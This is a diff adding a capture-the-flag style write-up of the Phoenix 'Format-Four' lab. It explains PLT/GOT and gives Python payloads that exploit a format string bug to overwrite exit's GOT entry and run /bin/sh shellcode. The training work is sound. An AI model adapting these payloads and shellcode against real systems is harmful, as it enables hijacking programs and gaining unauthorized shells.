@@ -431,4 +431,316 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
+---
+
+<div class="image-row">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+</div>
+
+
+---
+
+# Format-Four — Phoenix Exploit Education
+
+**Challenge**: [Phoenix/Format-Four](https://exploit.education/phoenix/format-four/)
+
+**Goal**: Overwrite the GOT entry for `exit@plt` via a **format string vulnerability** so that a subsequent call to `exit()` transfers control to a function of our choosing (for example, `congratulations`).
+
+---
+
+
+# Starting the Challenge
+
+Setting up challenge, and inputting a string we get nothing, fine:
+
+![input](/assets/phoenix-format/input.png)
+
+Well, `nm ./format-four`
+``` c
+user@phoenix-amd64:/opt/phoenix/i486$ nm format-four
+0804972c d _DYNAMIC
+080497cc d _GLOBAL_OFFSET_TABLE_
+08049720 d __CTOR_END__
+0804971c d __CTOR_LIST__
+08049728 D __DTOR_END__
+08049724 d __DTOR_LIST__
+080486b4 r __EH_FRAME_BEGIN__
+08048718 r __FRAME_END__
+0804864c r __GNU_EH_FRAME_HDR
+080497f0 D __TMC_END__
+080497f0 B __bss_start
+08048590 t __do_global_ctors_aux
+08048420 t __do_global_dtors_aux
+080497ec D __dso_handle
+         U __libc_start_main
+080497f0 D _edata
+08049810 B _end
+080485c1 T _fini
+080482d8 T _init
+08048350 T _start
+0804836b T _start_c
+080484e5 T bounce
+080497f0 b completed.5195
+08048503 T congratulations
+08048390 t deregister_tm_clones
+080497f4 b dtor_idx.5197
+         U exit
+080484a0 t frame_dummy
+08048523 T main
+080497f8 b object.5207
+         U printf
+         U puts
+         U read
+080483d0 t register_tm_clones
+```
+
+I note an _additional function_: `congratulations: 08048503 `. From the previous challenge, the program logic resides in `bounce`. 
+
+This challenge demonstrates how format string vulnerabilities can be combined with dynamic linking internals (PLT/GOT) to redirect program flow even when a vulnerable function does not return to a controlled address. In this binary the vulnerable code path ends with a call to `exit()`; a classic return-oriented buffer overflow would fail because control does not return to `main`. The correct approach is to overwrite the GOT entry for `exit` with the address of a chosen target so that when the program calls `exit` it jumps to our code.
+
+Key objectives:
+
+* Identify the vulnerable function and confirm it accepts user-controlled input as a *format string*.
+* Locate the GOT/PLT entries — specifically `exit@plt` and its GOT slot.
+* Use format string primitives to write the address of the target function (e.g. `congratulations`) into the GOT entry for `exit`.
+* Trigger the call to `exit` and observe control transfer.
+
+---
+
+## Theory
+
+**PLT (Procedure Linkage Table)** and **GOT (Global Offset Table)** are key to `dynamic linking`:
+
+A short refresher on the compile/link process:
+
+Preprocessing (#include, macros) → .i
+
+Compilation (C → assembly) → .s
+
+Assembly (assembly → object file) → .o
+
+Linking (object(s) + libraries → executable) → ELF/PE/Mach-O
+
+Linkage can be static (resolved at compile/link time) or dynamic (resolved at runtime).
+
+Example C program:
+
+int main() {
+    printf("hello!\n");
+    exit(0);
+}
+
+In a **dynamically-linked** binary, calls to _external functions_ like `printf` and `exit` are typically implemented via `puts@plt` / `exit@plt` _(PLT stubs)_ which use the GOT to store the resolved libc address the first time the symbol is used.
+
+![gdboutput](/assets/phoenix-format/gdbcolor.png)
+
+> Important notes:
+
+* `PLT/GOT` entries are _*per-symbol*_.
+
+* Whether the compiler uses puts or printf in the `PLT` depends on optimization and safety; sometimes `printf` is left intact and sometimes a simpler `puts` is used.
+
+* On Windows the analogous structure is the `Import Address Table` (IAT) with *`thunks`*.
+
+* **PLT (Procedure Linkage Table)** contains stubs used to call externally-linked functions. On first use a PLT stub performs a lookup and stores the resolved address into the GOT.
+* **GOT (Global Offset Table)** is where resolved function pointers are stored; modifying a GOT slot reroutes the corresponding PLT stub.
+
+This is why overwriting `exit`'s GOT entry is an effective way to hijack control flow at the point of an `exit()` call.
+
+---
+## Exploit Strategy
+
+
+Exploit Strategy is fairly similar to format-three, but instead of just changing variable we need to overwrite GOT entry, as discussed above 
+
+Format-four is interesting because it requires understanding linkage and exploitation of the PLT and GOT. After starting the challenge and providing input, nothing visible happens at first.
+
+
+The approach borrows from Format-Three but targeted at a GOT entry instead of a stack variable. Key steps:
+
+1. Locate the GOT entry for `exit@plt`.
+2. Locate the target function (`congratulations`) address.
+3. Place the GOT address(es) on the stack so the format string can reference them as write destinations.
+4. Use format-string write primitives (`%n`, `%hn`, `%hhn`) to perform controlled partial writes into the GOT slot, assembling the full target address across multiple smaller writes.
+5. Trigger `exit()` and observe the redirection.
+
+
+Digging deep into disassembly we need to find entry of exit@plt in GOT table,
+
+
+spin up gdb, 
+
+We need to find initial entry:
+
+![alt text](/assets/phoenix-format/img.png)
+
+The entry is like: 0x80497e4  => 08048503
+
+we need to place 0x80497e4 onto stack and try to write 08048503 in it,
+
+Initial approach is to place 0x80497e4 and count offset till when the printf starts printing from it stack and once it rinted out by %n we would write 08048503 like previously in Format-Three
+
+
+If you read the payload its coming out 45 bytes exact, we need this 45 bytes alignment anyways , our %n is working and perfectly dumping the bytes in our desired address,
+
+
+But we dont want 45 we need, more, so
+
+After lots of trial and error, 
+
+
+``` asm
+
+import struct
+EXIT_PLT = 0x80497e4
+exploit = ""
+exploit += struct.pack("I", EXIT_PLT)
+exploit += struct.pack("I", EXIT_PLT+1)
+exploit += struct.pack("I", EXIT_PLT+2)
+exploit += struct.pack("I", EXIT_PLT+3)
+exploit += "%x" * 10
+exploit += "%x"
+exploit += "A" * 189
+exploit += "%n"
+exploit += " " * 130
+exploit += "%n"
+exploit += " " * 1663
+exploit += "%n"
+#exploit += " "
+#exploit += "%n"
+print exploit
+```
+```
+user@phoenix-amd64:/opt/phoenix/i486$ python2 /tmp/payload.py > /tmp/payload
+```
+```
+user@phoenix-amd64:/opt/phoenix/i486$ ./format-four < /tmp/payload
+```
+![output](/assets/phoenix-format/code-redirection.png)
+
+---
+
+## Popping the Shell
+
+After proving GOT redirection to `congratulations`, the next step is to redirect `exit()` to the buffer containing shellcode. The idea is the same: write the address of a buffer (for example `ebp+0x8` or another stable stack/buffer address) into the `exit` GOT slot, then trigger `exit` so control transfers to our shellcode.
+
+> bytes in the format string (such as `0x90` or NOPs) are not executed by `printf`; they become executable only after control is redirected to their memory location and the CPU begins executing there.
+
+first in .gdbinit i unset and set the following:
+
+
+Lets reuse previous payload and clear the buffer
+```
+import struct
+EXIT_PLT = 0x80497e4
+exploit = ""
+exploit += "A" * 4
+exploit += "B" * 4
+exploit += "C" * 4
+exploit += "D" * 4
+exploit += struct.pack("I", EXIT_PLT)
+exploit += struct.pack("I", EXIT_PLT+1)
+exploit += struct.pack("I", EXIT_PLT+2)
+exploit += struct.pack("I", EXIT_PLT+3)
+exploit += "%x" * 10
+exploit += "%x"
+exploit += "%n"
+exploit += "%n"
+exploit += "%n"
+print exploit
+```
+
+in gdb:
+unset env LINES
+unset env COLUMNS
+unset env TERM
+unset env _
+unset env OLDPWD
+unset env SHLVL
+
+disassemble bounce and check the buffer out:
+
+![alt image](/assets/phoenix-format/buffer.png)
+
+
+i used this script for .gdbinit
+```
+unset env LINES
+unset env COLUMNS
+unset env TERM
+unset env _
+unset env OLDPWD
+unset env SHLVL
+
+set disassembly-flavor intel
+disassemble bounce
+
+b *0x080484f1
+run < /tmp/payload2
+x/20gwx $ebp+0x8
+```
+
+The logic stays same just instead of writing congratulation's address we need push buffer's address[ebp+0x8] on the stack.
+
+deliberatly choosing this 0xffffcd80 as first four address space are for AAAABBBBCCCCDDDD  (0xffffcd70)
+
+![alt image](/assets/phoenix-format/bounce.png)
+
+```
+import struct
+ADDR = 0x080497e4
+addresses = struct.pack("I", ADDR)
+addresses += struct.pack("I", ADDR+1)
+addresses += struct.pack("I", ADDR+2)
+addresses += struct.pack("I", ADDR+3)
+
+target = 0xffffcd80
+
+shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+
+buf = addresses
+#buf += "\xCC"
+buf += "\x90" * 43
+buf += shellcode
+buf += "%x" * 11
+buf += " "
+buf += "%n"
+buf += " " * 70
+buf += "%n"
+buf += " " * 50
+buf += "%n"
+buf += " " * 256
+buf += "%n"
+
+print buf
+```
+
+i first calculated the buffer address and reduces 43+21 bytes later so the padding would be adjusted.
+
+Run with:
+
+```bash
+cat /tmp/payload - | ./format-four
+```
+
+
+![alt image](/assets/phoenix-format/win.png)
+
+---
+
+# Takeway:
+
+---
+
+
+<div class="image-row">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+</div>
+
+
 
